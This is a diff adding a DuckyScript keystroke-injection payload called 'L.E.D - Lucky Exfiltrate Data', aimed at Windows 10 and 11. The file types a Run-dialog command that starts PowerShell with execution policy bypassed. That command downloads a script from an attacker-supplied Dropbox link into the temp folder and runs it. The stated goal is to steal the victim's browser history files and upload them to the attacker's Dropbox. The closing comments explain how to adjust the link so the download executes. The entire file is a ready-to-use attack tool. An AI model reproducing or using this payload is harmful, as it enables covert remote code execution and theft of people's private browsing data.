@@ -1,0 +1,14 @@
+REM     Title: L.E.D - Lucky Exfiltrate Data
+REM     Author: luckyman6
+REM     Description: A payload to exfiltrate browsers history files and upload them into the attacker Dropbox Folder.
+REM     Target: Windows 10, 11.
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'YOUR DROPBOX LED.PS1 DOWNLOAD FILE LINK' -OutFile $env:TEMP\LED.ps1; & $env:TEMP\LED.ps1; Read-Host -Prompt 'Exit'}"
+DELAY 100
+ENTER
+
+REM     Remember to replace the link with your DropBox shared link for the intended file to download.
+REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly.
